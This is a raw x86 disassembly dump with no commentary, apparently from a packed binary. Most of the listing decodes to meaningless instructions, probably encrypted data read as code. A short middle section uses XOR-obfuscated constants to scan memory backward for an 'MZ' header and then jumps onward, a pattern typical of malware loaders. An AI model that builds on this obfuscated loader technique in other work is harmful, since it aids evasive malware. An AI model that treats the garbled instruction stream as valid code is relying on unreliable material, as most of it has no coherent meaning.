  40c060:	jl     0x40c0d5
  40c062:	pushf  
  40c063:	mov    edi,0x663f0878
  40c068:	loopne 0x40c00e
  40c06a:	test   eax,0x1cac2f29
  40c06f:	mov    es,WORD PTR [ebx-0x4e]
  40c072:	sbb    bh,BYTE PTR [ebx]
  40c074:	push   edi
  40c075:	adc    eax,0xb9ed8e1c
  40c07a:	pop    esp
  40c07b:	sub    eax,0xf1fdc887
  40c080:	dec    ebx
  40c081:	sub    BYTE PTR [edi-0x64],ah
  40c084:	mov    esi,edi
  40c086:	dec    ebp
  40c087:	out    dx,al
  40c088:	jmp    0x40c0db
  40c08a:	xor    al,0x6a
  40c08c:	out    0xbf,eax
  40c08e:	xchg   ebp,eax
  40c08f:	fstp   QWORD PTR [edx]
  40c091:	data16 fwait
  40c093:	call   DWORD PTR [ecx]
  40c095:	add    BYTE PTR [ecx+0x63],bh
  40c098:	xchg   edi,eax
  40c099:	out    0x9f,al
  40c09b:	ins    BYTE PTR es:[edi],dx
  40c09c:	ret    
  40c09d:	add    eax,0xd1263ad5
  40c0a2:	and    DWORD PTR [ebx+0x5d],ebx
  40c0a5:	shl    DWORD PTR [edx+edx*2],cl
  40c0a8:	mov    eax,0x376897a7
  40c0ad:	or     bh,BYTE PTR [edx]
  40c0af:	mov    DWORD PTR [ebx],0xd7b3503
  40c0b5:	or     DWORD PTR gs:[ebp+0x6e],edi
  40c0b9:	popa   
  40c0ba:	adc    DWORD PTR [edx],0xffffff8b
  40c0bd:	xchg   edx,eax
  40c0be:	sub    DWORD PTR [edx+0x61a108f5],esp
  40c0c4:	nop
  40c0c5:	es or  BYTE PTR ds:[ecx-0x5c],cl
  40c0ca:	jecxz  0x40c090
  40c0cc:	pusha  
  40c0cd:	popf   
  40c0ce:	push   esp
  40c0cf:	pop    esi
  40c0d0:	jmp    0xd47d:0xde46e03a
  40c0d7:	inc    edx
  40c0d8:	es stos DWORD PTR es:[edi],eax
  40c0da:	sbb    DWORD PTR [ecx+0x12],ecx
  40c0dd:	mov    dl,0x55
  40c0df:	pop    esp
  40c0e0:	pop    ebp
  40c0e1:	add    dl,BYTE PTR [ecx+0x31]
  40c0e4:	inc    eax
  40c0e5:	loop   0x40c115
  40c0e7:	xor    DWORD PTR [ecx],ecx
  40c0e9:	xchg   al,ch
  40c0eb:	xlat   BYTE PTR ds:[ebx]
  40c0ec:	xchg   BYTE PTR ds:0xec020020,cl
  40c0f2:	or     al,BYTE PTR [esi]
  40c0f4:	bound  ebx,QWORD PTR [eax-0x14]
  40c0f7:	dec    edi
  40c0f8:	mov    al,0x70
  40c0fa:	jge    0x40c12a
  40c0fc:	or     al,0x98
  40c0fe:	cmp    eax,ebp
  40c100:	cmp    eax,0x49f65718
  40c105:	(bad)  
  40c106:	(bad)  
  40c107:	push   DWORD PTR [esi]
  40c109:	jmp    0xd039cbcb
  40c10e:	ret    0x4193
  40c111:	ins    DWORD PTR es:[edi],dx
  40c112:	out    0x30,al
  40c114:	mov    bh,BYTE PTR [edx+0x26]
  40c117:	fnstcw WORD PTR [ebx-0x2b]
  40c11a:	sbb    eax,0xa3009ac
  40c11f:	dec    esi
  40c120:	or     bl,BYTE PTR [eax+0x746f61c7]
  40c126:	(bad)  
  40c127:	or     DWORD PTR [esi+0x12],edx
  40c12a:	int    0xf
  40c12c:	loopne 0x40c0e1
  40c12e:	sub    cl,BYTE PTR [esi+ecx*1-0x7e]
  40c132:	inc    esi
  40c133:	daa    
  40c134:	outs   dx,DWORD PTR ds:[esi]
  40c135:	fwait
  40c136:	pop    ecx
  40c137:	inc    eax
  40c138:	push   ecx
  40c139:	xor    dl,BYTE PTR [ecx+0xf]
  40c13c:	adc    al,0xd7
  40c13e:	outs   dx,DWORD PTR ds:[esi]
  40c13f:	mov    bh,0x93
  40c141:	or     eax,0x77a2d903
  40c146:	leave  
  40c147:	add    cl,BYTE PTR [eax+0x2]
  40c14a:	pop    es
  40c14b:	ds cwde 
  40c14d:	aas    
  40c14e:	inc    ebx
  40c14f:	sbb    dl,BYTE PTR [edx-0xf]
  40c152:	adc    esp,DWORD PTR [ecx+0x640a3e98]
  40c158:	pop    ebx
  40c159:	mov    esi,0xb269a998
  40c15e:	loopne 0x40c1c9
  40c160:	lods   al,BYTE PTR ds:[esi]
  40c161:	loop   0x40c122
  40c163:	sub    eax,0xb5bb8c87
  40c168:	std    
  40c169:	xchg   DWORD PTR [ecx+0x8bca4d2],esi
  40c16f:	call   0xdd60:0xee775129
  40c176:	in     al,0xb9
  40c178:	cmp    edi,eax
  40c17a:	mov    sp,WORD PTR [esi+ecx*1-0x7b259da2]
  40c182:	ret    0x7a39
  40c185:	sub    al,BYTE PTR [esi]
  40c187:	ficom  DWORD PTR [eax]
  40c189:	mov    ecx,DWORD PTR [esi+0x51]
  40c18c:	fstp   TBYTE PTR [edi-0x55]
  40c18f:	arpl   WORD PTR [edi+0x35],cx
  40c192:	xchg   edi,eax
  40c193:	sub    ebp,DWORD PTR [ecx]
  40c195:	xor    DWORD PTR [ebx],edx
  40c197:	mov    al,ds:0xd8fc5e36
  40c19c:	xlat   BYTE PTR ds:[ebx]
  40c19d:	add    dl,dh
  40c19f:	in     eax,dx
  40c1a0:	cmp    eax,0xbebdcbc4
  40c1a5:	stc    
  40c1a6:	dec    eax
  40c1a7:	loopne 0x40c178
  40c1a9:	pop    esp
  40c1aa:	aaa    
  40c1ab:	mov    ecx,eax
  40c1ad:	(bad)  
  40c1af:	mov    ds:0xf9a574fe,eax
  40c1b4:	or     ebp,edi
  40c1b6:	add    bh,BYTE PTR [edx+0x3109c3d3]
  40c1bc:	leave  
  40c1bd:	and    al,0x47
  40c1bf:	fwait
  40c1c0:	neg    DWORD PTR [eax+0x2b353e9e]
  40c1c6:	shr    BYTE PTR [ecx+eiz*4-0x17],cl
  40c1ca:	pop    ds
  40c1cb:	retf   
  40c1cc:	nop
  40c1cd:	mov    esp,0x4cd56115
  40c1d2:	rcr    BYTE PTR [ebx+esi*8+0x267c9c1d],0xb8
  40c1da:	push   ebp
  40c1db:	xchg   ebp,eax
  40c1dc:	inc    esp
  40c1dd:	and    al,0x9e
  40c1df:	pop    ebp
  40c1e0:	adc    ah,BYTE PTR [edx]
  40c1e2:	popa   
  40c1e3:	jmp    0x40c24a
  40c1e5:	frstor [edi]
  40c1e7:	push   ds
  40c1e8:	retf   
  40c1e9:	ss dec esp
  40c1eb:	xor    edi,edx
  40c1ed:	jno    0x40c1d7
  40c1ef:	shl    DWORD PTR [edx-0x14],0xa3
  40c1f3:	pop    ss
  40c1f4:	dec    edi
  40c1f5:	xchg   edx,eax
  40c1f6:	int    0x1b
  40c1f8:	pop    esi
  40c1f9:	inc    edx
  40c1fa:	dec    ebx
  40c1fb:	cmp    DWORD PTR [ecx+0x62e8fe82],0xcf6d70d6
  40c205:	mov    ebp,0x6139686e
  40c20a:	adc    eax,0xec9daeaa
  40c20f:	xchg   edx,eax
  40c210:	inc    edi
  40c211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c212:	or     al,0xc4
  40c214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c215:	fild   DWORD PTR [ecx]
  40c217:	push   0xffffffac
  40c219:	iret   
  40c21a:	inc    ebx
  40c21b:	popf   
  40c21c:	shl    BYTE PTR [esi-0x5ad675ff],cl
  40c222:	mov    BYTE PTR [edx],bh
  40c224:	mov    ecx,0x7878a2e
  40c229:	pop    esp
  40c22a:	jp     0x40c21b
  40c22c:	gs (bad) 
  40c22e:	push   esp
  40c22f:	(bad)  
  40c230:	into   
  40c231:	test   BYTE PTR [ebp+0x3c1d495d],ch
  40c237:	mov    dh,0x94
  40c239:	mov    edi,0xd09e78c7
  40c23e:	outs   dx,DWORD PTR ds:[esi]
  40c23f:	jmp    0x40c2a4
  40c241:	int    0xa
  40c243:	lds    esp,FWORD PTR [edx]
  40c245:	xor    eax,0xbb50a9b
  40c24a:	lods   eax,DWORD PTR ds:[esi]
  40c24b:	pop    edx
  40c24c:	xchg   esi,eax
  40c24d:	inc    esi
  40c24e:	sub    al,0x2f
  40c250:	out    0x94,al
  40c252:	aam    0x6a
  40c254:	mov    eax,0x445fa77a
  40c259:	mov    ds:0x1accd158,al
  40c25e:	addr16 iret 
  40c260:	pop    esi
  40c261:	das    
  40c262:	cmp    eax,0xca8c3cf4
  40c267:	push   esi
  40c268:	push   0xb
  40c26a:	mov    ecx,0x9f4a9fa0
  40c26f:	add    ah,BYTE PTR [ebp+ecx*4-0x37d0a62b]
  40c276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c277:	shl    DWORD PTR [ebp+0x4ab0984a],1
  40c27d:	push   cs
  40c27e:	xor    ah,cl
  40c280:	cmp    al,0xba
  40c282:	push   es
  40c283:	lds    ebp,FWORD PTR [eax+0x21]
  40c286:	adc    ah,al
  40c288:	sub    DWORD PTR [ebx+0xa35ce2c],esi
  40c28e:	and    BYTE PTR [ebx],ch
  40c290:	les    esi,FWORD PTR [esi+0x1e]
  40c293:	popa   
  40c294:	icebp  
  40c295:	fild   WORD PTR [ecx-0x9762250]
  40c29b:	in     al,0x80
  40c29d:	mov    ch,al
  40c29f:	mov    eax,DWORD PTR [eax+ebx*2+0x79c1f5f9]
  40c2a6:	leave  
  40c2a7:	xlat   BYTE PTR ds:[ebx]
  40c2a8:	ja     0x40c2eb
  40c2aa:	dec    esp
  40c2ab:	sbb    al,0xeb
  40c2ad:	cmc    
  40c2ae:	jae    0x40c326
  40c2b0:	stos   DWORD PTR es:[edi],eax
  40c2b1:	pusha  
  40c2b2:	mov    ch,0x35
  40c2b4:	pop    ecx
  40c2b5:	mov    esi,0x5afd1f1e
  40c2ba:	pushf  
  40c2bb:	div    DWORD PTR [ebx-0x7c2062f9]
  40c2c1:	mov    ds:0xd692ede7,al
  40c2c6:	icebp  
  40c2c7:	xchg   edi,esp
  40c2c9:	das    
  40c2ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2cb:	out    dx,eax
  40c2cc:	fs es push esp
  40c2cf:	rcl    DWORD PTR [edx],cl
  40c2d1:	jbe    0x40c2c4
  40c2d3:	dec    eax
  40c2d4:	(bad)  
  40c2d5:	pop    eax
  40c2d6:	jmp    0xe03859ba
  40c2db:	adc    esi,esp
  40c2dd:	dec    ebx
  40c2de:	ins    BYTE PTR es:[edi],dx
  40c2df:	mov    dh,0xfa
  40c2e1:	add    BYTE PTR [ecx-0x3366db7],ch
  40c2e7:	mov    ah,0x95
  40c2e9:	arpl   dx,dx
  40c2eb:	aad    0x6d
  40c2ed:	iret   
  40c2ee:	cmp    dh,BYTE PTR [ecx-0x574c03cf]
  40c2f4:	rcr    esi,cl
  40c2f6:	pop    es
  40c2f7:	scas   eax,DWORD PTR es:[edi]
  40c2f8:	push   ecx
  40c2f9:	mov    ebp,ss
  40c2fb:	xchg   esp,eax
  40c2fc:	xor    al,0xb4
  40c2fe:	inc    edx
  40c2ff:	fnstcw WORD PTR [ebx]
  40c301:	push   ecx
  40c302:	ret    
  40c303:	or     al,0xe6
  40c305:	inc    ebp
  40c306:	mov    edi,0x2f8f4d3f
  40c30b:	out    dx,eax
  40c30c:	dec    edx
  40c30d:	(bad)  
  40c30e:	pop    edx
  40c30f:	nop
  40c310:	js     0x40c295
  40c312:	mov    esp,0x767ef830
  40c317:	sbb    ebp,DWORD PTR [ebx-0x732eea5b]
  40c31d:	mov    edx,edx
  40c31f:	mov    esi,0x9bbf9448
  40c324:	lea    ebx,[ecx]
  40c326:	push   edx
  40c327:	add    eax,0x119388b6
  40c32c:	add    edx,DWORD PTR [ebp-0x1ed00eca]
  40c332:	retf   0xe94d
  40c335:	into   
  40c336:	jge    0x40c2d2
  40c338:	pop    edx
  40c339:	cmp    al,0x2b
  40c33b:	fdivp  st(5),st
  40c33d:	add    BYTE PTR ds:0x688b875e,0xd0
  40c344:	dec    ecx
  40c345:	xor    al,0x4d
  40c347:	fadd   st(7),st
  40c349:	sahf   
  40c34a:	call   0x4efcec20
  40c34f:	mov    ds:0x7f8d79d2,eax
  40c354:	cmp    al,0x2a
  40c356:	imul   ebx,DWORD PTR [edx-0x28197a79],0x3d42fc8a
  40c360:	(bad)  [ecx+0x74494007]
  40c366:	jb     0x40c360
  40c368:	test   DWORD PTR [edi],0x39bf602f
  40c36e:	and    al,0x8b
  40c370:	mov    cl,0x9f
  40c372:	sbb    al,0x2c
  40c374:	(bad)  
  40c375:	xchg   ebx,eax
  40c376:	jecxz  0x40c38a
  40c378:	sub    al,0x86
  40c37a:	shr    BYTE PTR [edi],1
  40c37c:	inc    ecx
  40c37d:	pop    gs
  40c37f:	inc    ecx
  40c380:	mov    ecx,0xfc7587e1
  40c385:	sub    DWORD PTR [esi+0x73],0x14
  40c389:	cs and edx,esp
  40c38c:	cmp    esp,DWORD PTR [esi-0x20501bc0]
  40c392:	mov    dh,dh
  40c394:	(bad)  
  40c396:	inc    ebp
  40c397:	bnd jp 0x40c3d5
  40c39a:	loope  0x40c409
  40c39c:	xchg   esi,eax
  40c39d:	icebp  
  40c39e:	sbb    al,0x9d
  40c3a0:	cmp    BYTE PTR [edx+ecx*8-0x7339b5c7],ah
  40c3a7:	repnz lea ebp,[edi+0xa0850f7]
  40c3ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3af:	mov    esp,0xecddadcd
  40c3b4:	nop
  40c3b5:	arpl   WORD PTR [edi+0x2f],dx
  40c3b8:	cmp    DWORD PTR [ebx-0x1e],ebx
  40c3bb:	sbb    bl,ch
  40c3bd:	mov    ebx,0x94a9026
  40c3c2:	inc    ebx
  40c3c3:	gs (bad) 
  40c3c5:	jmp    0x40c3e3
  40c3c7:	dec    eax
  40c3c8:	nop
  40c3c9:	xor    eax,0x7d25c095
  40c3ce:	(bad)  
  40c3cf:	dec    edi
  40c3d0:	sbb    esi,DWORD PTR [ecx]
  40c3d2:	cld    
  40c3d3:	fwait
  40c3d4:	mov    es:0x2479982,eax
  40c3da:	fsub   QWORD PTR [esi-0x50d7e25b]
  40c3e0:	jns    0x40c3cd
  40c3e2:	cwde   
  40c3e3:	cmp    BYTE PTR [esi],dl
  40c3e5:	pop    esp
  40c3e6:	(bad)  
  40c3e7:	push   ebx
  40c3e8:	hlt    
  40c3e9:	fidivr DWORD PTR [eax]
  40c3eb:	xor    dl,dl
  40c3ed:	cmp    ebx,ebp
  40c3ef:	cmp    DWORD PTR [ebx],edi
  40c3f1:	dec    esp
  40c3f2:	sbb    ebx,eax
  40c3f4:	jg     0x40c3c3
  40c3f6:	int3   
  40c3f7:	repz aas 
  40c3f9:	int    0xe7
  40c3fb:	inc    esp
  40c3fc:	out    0xc7,eax
  40c3fe:	sub    edi,0xe5407c8b
  40c404:	repz sbb edx,DWORD PTR [ecx+0x42]
  40c408:	adc    BYTE PTR [eax+0x486f5c2f],ch
  40c40e:	adc    eax,0xcaa25976
  40c413:	jmp    0x40c491
  40c415:	test   BYTE PTR [ebx-0x7e],dl
  40c418:	push   0x80f1fc36
  40c41d:	cmp    BYTE PTR [edx-0x13],al
  40c420:	mov    eax,0xeda06b97
  40c425:	stos   BYTE PTR es:[edi],al
  40c426:	dec    ecx
  40c427:	ja     0x40c42a
  40c429:	rcr    DWORD PTR [esi+0x51],0x2a
  40c42d:	and    edx,ebx
  40c42f:	test   eax,0x10a5bb8e
  40c434:	aam    0x23
  40c436:	je     0x40c487
  40c438:	(bad)  
  40c439:	dec    esi
  40c43a:	gs gs jne 0x40c401
  40c43e:	dec    esp
  40c43f:	cmc    
  40c440:	aad    0x4c
  40c442:	jne    0x40c44f
  40c444:	stos   BYTE PTR es:[edi],al
  40c445:	push   0x8c9118f4
  40c44a:	bound  edx,QWORD PTR [edi+edi*1]
  40c44d:	and    al,0x3a
  40c44f:	pop    ecx
  40c450:	jmp    0xc86c8139
  40c455:	loop   0x40c4bc
  40c457:	pop    esp
  40c458:	or     dh,0xf1
  40c45b:	(bad)  
  40c45c:	push   ss
  40c45d:	xor    dh,bh
  40c45f:	ret    
  40c460:	add    BYTE PTR [edx+0x15],0x62
  40c464:	sbb    eax,0xb654dc4
  40c469:	mov    ch,0xf7
  40c46b:	jg     0x40c41d
  40c46d:	jnp    0x40c46b
  40c46f:	cdq    
  40c470:	ror    BYTE PTR [edx+0x35],0xc0
  40c474:	xlat   BYTE PTR ds:[ebx]
  40c475:	out    0x45,al
  40c477:	scas   al,BYTE PTR es:[edi]
  40c478:	(bad)  
  40c479:	retf   0x19c2
  40c47c:	test   DWORD PTR [eax+0x2],edx
  40c47f:	xchg   BYTE PTR [edx+0x66a4a72c],dl
  40c485:	mov    ebx,DWORD PTR [eax-0x7269dc0c]
  40c48b:	add    eax,DWORD PTR ds:0x624577df
  40c491:	pop    edx
  40c492:	mov    ebp,0x4310e970
  40c497:	mov    ds:0x8f84bd24,al
  40c49c:	aas    
  40c49d:	push   0x370b3d2f
  40c4a2:	fs gs aas 
  40c4a5:	ins    BYTE PTR es:[edi],dx
  40c4a6:	push   DWORD PTR [ecx]
  40c4a8:	or     dl,BYTE PTR ss:[ebx+eax*2-0x7cb3ce86]
  40c4b0:	in     eax,dx
  40c4b1:	fs enter 0x3fd0,0x19
  40c4b6:	stos   BYTE PTR es:[edi],al
  40c4b7:	cmp    bh,BYTE PTR [edi+0x2b]
  40c4ba:	jnp    0x40c482
  40c4bc:	or     al,0xdc
  40c4be:	js     0x40c47d
  40c4c0:	jg     0x40c4c5
  40c4c2:	(bad)  
  40c4c3:	mov    ah,0x62
  40c4c5:	dec    esp
  40c4c6:	jl     0x40c4d7
  40c4c8:	fisubr WORD PTR [eax]
  40c4ca:	jno    0x40c533
  40c4cc:	or     eax,0xfa5b2618
  40c4d1:	(bad)  
  40c4d2:	dec    esp
  40c4d3:	push   ss
  40c4d4:	xchg   DWORD PTR [eax+0x4303c921],ebp
  40c4da:	xor    eax,0xf55fb891
  40c4df:	fneni(8087 only) 
  40c4e1:	xor    al,0x8d
  40c4e3:	inc    ecx
  40c4e4:	adc    BYTE PTR [ebx+0x2b],cl
  40c4e7:	cmc    
  40c4e8:	add    eax,0xe72aa185
  40c4ed:	rol    BYTE PTR [esi],cl
  40c4ef:	mov    ch,0x65
  40c4f1:	mov    edi,0x4b4edfa2
  40c4f6:	pusha  
  40c4f7:	mov    BYTE PTR [ebp-0x26],bl
  40c4fa:	mul    BYTE PTR [edx-0x61267343]
  40c500:	mov    dh,0x84
  40c502:	push   ebp
  40c503:	ins    DWORD PTR es:[edi],dx
  40c504:	repz xor BYTE PTR [ebp-0x17],bl
  40c508:	(bad)  
  40c509:	mov    dh,0x6d
  40c50b:	fmul   DWORD PTR [ecx]
  40c50d:	scas   eax,DWORD PTR es:[edi]
  40c50e:	cmc    
  40c50f:	cmp    eax,0x325e532f
  40c514:	pop    ebp
  40c515:	mov    edx,0x5599ec10
  40c51a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c51b:	or     bh,dl
  40c51d:	ror    DWORD PTR [eax+0x2],0xb5
  40c521:	jnp    0x40c4f0
  40c523:	pop    ss
  40c524:	add    al,0x59
  40c526:	test   al,0xe9
  40c528:	adc    DWORD PTR [eax],edx
  40c52a:	adc    DWORD PTR [ebx-0x2755e22f],0x4b
  40c531:	xchg   ebp,eax
  40c532:	in     eax,dx
  40c533:	shr    DWORD PTR [edi],cl
  40c535:	adc    ebx,ebp
  40c537:	xchg   ebx,eax
  40c538:	out    dx,eax
  40c539:	retf   
  40c53a:	scas   eax,DWORD PTR es:[edi]
  40c53b:	inc    eax
  40c53c:	in     eax,0x4f
  40c53e:	hlt    
  40c53f:	jmp    0x40c4e5
  40c541:	mov    ds:0x62b4039f,al
  40c546:	push   es
  40c547:	and    esi,edi
  40c549:	shl    DWORD PTR [eax],0xce
  40c54c:	ins    BYTE PTR es:[edi],dx
  40c54d:	out    0xff,eax
  40c54f:	mov    dh,0xf6
  40c551:	in     eax,0x98
  40c553:	xor    DWORD PTR [eax+eax*1-0x5f],ecx
  40c557:	es push ds
  40c559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c55a:	ins    BYTE PTR es:[edi],dx
  40c55b:	imul   eax,DWORD PTR [edx],0x7e788898
  40c561:	js     0x40c550
  40c563:	and    eax,0x721e7055
  40c568:	push   ds
  40c569:	fstp   QWORD PTR [edx-0x63]
  40c56c:	stos   BYTE PTR es:[edi],al
  40c56d:	sbb    al,0x77
  40c56f:	pushf  
  40c570:	push   esi
  40c571:	cs xchg edx,eax
  40c573:	in     al,dx
  40c574:	or     BYTE PTR [ecx],ch
  40c576:	xchg   edx,eax
  40c577:	cdq    
  40c578:	ficom  DWORD PTR [edx+eiz*4-0x5799ccb9]
  40c57f:	jnp    0x40c547
  40c581:	and    eax,DWORD PTR [edx-0x7760feea]
  40c587:	pop    esp
  40c588:	les    ebp,FWORD PTR [eax+0xe]
  40c58b:	rep ins BYTE PTR es:[edi],dx
  40c58d:	add    eax,DWORD PTR [ebx]
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0x4a4b873c
  40c65b:	enter  0x173d,0xa2
  40c65f:	loopne 0x40c6dd
  40c661:	jl     0x40c6b1
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	push   0xdf89cde4
  40c66b:	adc    cl,BYTE PTR [edx-0x3326625c]
  40c671:	mov    bh,0x79
  40c673:	xchg   edi,eax
  40c674:	mov    bh,0x98
  40c676:	push   0x17b2bf87
  40c67b:	imul   DWORD PTR [edx+0x75]
  40c67e:	sub    cl,BYTE PTR [edx-0x13]
  40c681:	neg    ebx
  40c683:	xlat   BYTE PTR ds:[ebx]
  40c684:	in     eax,dx
  40c685:	add    dh,BYTE PTR [edx+0x16]
  40c688:	stc    
  40c689:	mov    esp,0xfb883056
  40c68e:	xchg   edi,eax
  40c68f:	cmp    DWORD PTR [eax+ebp*2+0x38691640],eax
  40c696:	jns    0x40c619
  40c698:	pushf  
  40c699:	(bad)  
  40c69a:	sbb    DWORD PTR [eax-0xf],eax
  40c69d:	std    
  40c69e:	pop    ebp
  40c69f:	test   BYTE PTR [eax-0x73],0x70
  40c6a3:	stc    
  40c6a4:	popa   
  40c6a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6a6:	push   cs
  40c6a7:	ds test al,0xb4
  40c6aa:	aaa    
  40c6ab:	mov    fs,eax
  40c6ad:	sti    
  40c6ae:	inc    ebp
  40c6af:	mov    WORD PTR [ebx],gs
  40c6b1:	sub    ch,BYTE PTR [eax-0x3f51a9b2]
  40c6b7:	in     eax,dx
  40c6b8:	mov    ds,WORD PTR [edi-0x31885462]
  40c6be:	(bad)  
  40c6bf:	xchg   esp,eax
  40c6c0:	jne    0x40c6f7
  40c6c2:	jnp    0x40c706
  40c6c4:	sub    dh,BYTE PTR [ebp+eax*4-0xa]
  40c6c8:	mov    bh,0x7f
  40c6ca:	mov    ebp,0xc16700e3
  40c6cf:	aas    
  40c6d0:	pop    ebp
  40c6d1:	or     bh,dl
  40c6d3:	fwait
  40c6d4:	imul   ebx,DWORD PTR [ecx],0xffffffbc
  40c6d7:	popf   
  40c6d8:	jo     0x40c6cd
  40c6da:	imul   esi,DWORD PTR [ecx+0x50],0xb
  40c6de:	mov    ah,0x2f
  40c6e0:	sbb    al,0x47
  40c6e2:	dec    edi
  40c6e3:	and    DWORD PTR [edi+eax*8+0x2e],ecx
  40c6e7:	arpl   WORD PTR [edi],bx
  40c6e9:	cmp    edx,DWORD PTR [eax-0x181cb87d]
  40c6ef:	int    0x3f
  40c6f1:	enter  0xbd8d,0x3
  40c6f5:	jne    0x40c715
  40c6f7:	jo     0x40c73f
  40c6f9:	xchg   edi,ebp
  40c6fb:	pop    esp
  40c6fc:	lds    edx,FWORD PTR [eax+ebp*8+0xc251df4]
  40c703:	jecxz  0x40c69f
  40c705:	outs   dx,BYTE PTR ds:[esi]
  40c706:	pop    esi
  40c707:	sub    DWORD PTR ds:0xea905a3,esp
  40c70d:	repnz inc cl
  40c710:	ret    
  40c711:	add    ebx,DWORD PTR [edi]
  40c713:	div    DWORD PTR gs:[edi+eiz*4]
  40c717:	test   al,0xf4
  40c719:	in     eax,0x67
  40c71b:	and    al,0xc7
  40c71d:	add    bh,BYTE PTR [ecx]
  40c71f:	mov    esi,0x265fb0fa
  40c724:	loopne 0x40c70d
  40c726:	mov    eax,0x7e2509e8
  40c72b:	xor    al,0xca
  40c72d:	(bad)  
  40c72e:	test   eax,0xc1ebcaec
  40c733:	push   cs
  40c734:	ins    BYTE PTR es:[edi],dx
  40c735:	jp     0x40c760
  40c737:	adc    al,0x4e
  40c739:	adc    cl,bh
  40c73b:	xlat   BYTE PTR ds:[bx]
  40c73d:	or     DWORD PTR [ebp-0x3b],edx
  40c740:	jle    0x40c74e
  40c742:	sub    al,0x85
  40c744:	test   eax,ebx
  40c746:	mov    bl,BYTE PTR [ebx]
  40c748:	pop    ds
  40c749:	or     edx,DWORD PTR [edi-0x49]
  40c74c:	test   DWORD PTR cs:0xc300ca4,0x43739d12
  40c757:	popa   
  40c758:	data16 scas al,BYTE PTR es:[edi]
  40c75a:	xor    edi,ebp
  40c75c:	xchg   ebp,eax
  40c75d:	adc    BYTE PTR ds:0xc412cf98,0x57
  40c764:	jmp    0xe2cae20c
  40c769:	mov    ecx,0xee9bcbc4
  40c76e:	push   ecx
  40c76f:	test   DWORD PTR [edx-0x3900ff7e],0x1eba191e
  40c779:	in     eax,dx
  40c77a:	pushf  
  40c77b:	sbb    edx,DWORD PTR [edi-0x3e]
  40c77e:	dec    ebp
  40c77f:	ss cld 
  40c781:	clc    
  40c782:	xchg   ecx,eax
  40c783:	fadd   DWORD PTR [ebx+0x6e]
  40c786:	dec    edx
  40c787:	inc    esp
  40c788:	push   esi
  40c789:	outs   dx,DWORD PTR ds:[esi]
  40c78a:	jno    0x40c7b1
  40c78c:	fs pop ebx
  40c78e:	or     DWORD PTR [ecx-0x15],ecx
  40c791:	mov    ds:0xc0237e63,al
  40c796:	dec    esp
  40c797:	pop    edi
  40c798:	enter  0xf081,0x9f
  40c79c:	retf   0x6c7d
  40c79f:	sar    dl,cl
  40c7a1:	xchg   esp,eax
  40c7a2:	jl     0x40c78d
  40c7a4:	ja     0x40c7c9
  40c7a6:	inc    esi
  40c7a7:	clc    
  40c7a8:	inc    esi
  40c7a9:	popa   
  40c7aa:	scas   eax,DWORD PTR es:[edi]
  40c7ab:	sbb    DWORD PTR [ebx+0x52],ebx
  40c7ae:	popa   
  40c7af:	push   ecx
  40c7b0:	push   0x9eed8287
  40c7b5:	xchg   edx,eax
  40c7b6:	rol    BYTE PTR [ecx-0x68f915d9],1
  40c7bc:	aad    0x36
  40c7be:	xchg   ebp,eax
  40c7bf:	ss mov ah,ch
  40c7c2:	mov    edx,DWORD PTR [esi-0x13891183]
  40c7c8:	mov    edx,0x9ea7150a
  40c7cd:	arpl   di,dx
  40c7cf:	in     eax,dx
  40c7d0:	add    eax,0x81990741
  40c7d5:	add    DWORD PTR [eax-0x47493409],eax
  40c7db:	dec    BYTE PTR [eax+eiz*2-0x3c75b7f]
  40c7e2:	cmp    al,0xdf
  40c7e4:	and    al,0xd9
